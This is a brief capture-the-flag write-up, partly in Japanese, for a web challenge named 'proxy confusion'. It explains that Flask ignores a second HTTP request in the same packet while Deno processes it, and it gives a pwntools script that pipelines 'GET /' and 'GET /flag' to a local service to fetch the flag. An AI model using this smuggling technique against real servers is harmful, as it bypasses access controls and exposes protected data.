# proxy confusion

## Description
Which web server would you like?

## Writeup

同一パケットに複数のリクエストが含まれている場合、Flaskは２つ目を無視するが、Denoは２つ目のリクエストとして扱うことを利用する。

```python
from pwn import *

io = remote("localhost", 4000)
io.send(b"""
GET / HTTP/1.1

GET /flag HTTP/1.1
        """.strip().replace(b"\n", b"\r\n") + b"\r\n\r\n")

r = io.recv()
print(r.decode())
```